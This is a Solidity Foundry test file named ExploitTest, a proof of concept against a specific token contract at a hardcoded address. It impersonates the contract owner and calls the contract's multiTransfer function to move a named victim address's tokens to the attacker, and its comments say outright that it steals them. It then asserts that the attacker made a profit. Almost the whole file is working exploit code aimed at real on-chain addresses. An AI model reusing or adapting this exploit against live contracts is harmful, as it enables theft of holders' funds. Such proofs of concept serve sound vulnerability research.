// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Interface for the target contract to access its functions
interface SPOOKYHALLOWEENFLOKI {
    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external;
    function _maxTxAmount() external view returns (uint256);
    function getOwner() external view returns (address);
}

// BEP20 interface is already available from the contract code
interface BEP20 {
    function balanceOf(address account) external view returns (uint256);
    function getOwner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address private victim;
    uint256 private victimInitialBalance;
    uint256 private attackerInitialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode and impersonate owner
        // We need to find a victim address with tokens
        victim = 0xc9550CF5389697c28d04e9A6ed3F0eF2838d749c; // Using marketingFeeReceiver as victim since it likely has tokens

        // Get initial balances
        attackerInitialBalance = BEP20(TARGET).balanceOf(attacker);
        victimInitialBalance = BEP20(TARGET).balanceOf(victim);

        // Ensure victim has tokens
        if (victimInitialBalance == 0) {
            // If victim has no tokens, we need to find another victim
            // Let's try teamFeeReceiver
            victim = 0xc0a641F1F6ed23384bf8dD3A5425aFcbE9A9f7dF;
            victimInitialBalance = BEP20(TARGET).balanceOf(victim);
        }

        require(victimInitialBalance > 0, "Victim must have tokens");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f).balanceOf(address(this));
        // Impersonate the contract owner
        address owner = BEP20(TARGET).getOwner();
        vm.startPrank(owner);

        // Prepare arrays for multiTransfer
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);

        // Set attacker as recipient
        recipients[0] = attacker;

        // Steal all victim's tokens (or a portion if there are limits)
        uint256 stealAmount = victimInitialBalance;

        // Check for max transaction limits
        uint256 maxTxAmount = SPOOKYHALLOWEENFLOKI(TARGET)._maxTxAmount();
        if (stealAmount > maxTxAmount) {
            // Take max allowed amount
            stealAmount = maxTxAmount;
        }

        amounts[0] = stealAmount;

        // Call the vulnerable multiTransfer function
        SPOOKYHALLOWEENFLOKI(TARGET).multiTransfer(victim, recipients, amounts);

        vm.stopPrank();

        // Verify exploit succeeded
        uint256 attackerFinalBalance = BEP20(TARGET).balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
